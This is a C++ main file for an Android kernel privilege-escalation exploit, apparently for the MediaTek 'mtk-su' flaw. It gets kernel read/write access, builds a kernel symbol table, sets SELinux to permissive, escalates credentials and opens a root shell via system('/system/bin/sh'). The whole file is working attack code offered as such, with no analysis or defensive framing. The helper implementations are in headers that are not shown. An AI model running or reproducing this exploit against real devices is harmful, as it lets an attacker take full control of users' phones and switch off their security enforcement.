#include "kallsyms.hpp"
#include "log.hpp"
#include "mtk_su.hpp"
#include "selinux.hpp"
#include "task.hpp"

int main()
{
	log_info("Initializing kernel read and write");
	auto kern_rw = std::make_unique<MTKSu>();
	bool success = kern_rw->initialize();
	if (!success) {
		log_error("Failed to initialize the kernel read/write");
		return 1;
	}

	log_info("Building the kernel symbols table");
	auto symbol_table = std::make_unique<std::map<std::string, uint64_t>>();
	success = build_kernel_symbol_table(*kern_rw.get(), *symbol_table.get());
	if (!success) {
		log_error("Failed to build the kernel symbols table");
		return 1;
	}

	bool is_enforcing;
	success = is_selinux_enforcing(is_enforcing);
	if (!success) {
		log_error("Failed to determine if SELinux is enforcing");
		return 1;
	}
	if (is_enforcing) {
		log_info("Disabling SELinux");
		set_selinux_permissive(*kern_rw.get(), *symbol_table.get());
	} else {
		log_info("SELinux is already permissive");
	}

	log_info("Escalating credentials");
	success = escalate_creds(*kern_rw.get(), *symbol_table.get());
	if (!success) {
		log_error("Failed to escalate credentials");
		return 1;
	}

	success = kern_rw->cleanup();
	if (!success) {
		// Best effort cleanup
		log_error("Kernel RW cleanup failed");
	}

	log_info("Popping root shell");
	system("/system/bin/sh");

	log_info("Exiting mtk-su exploit");
	return 0;
}
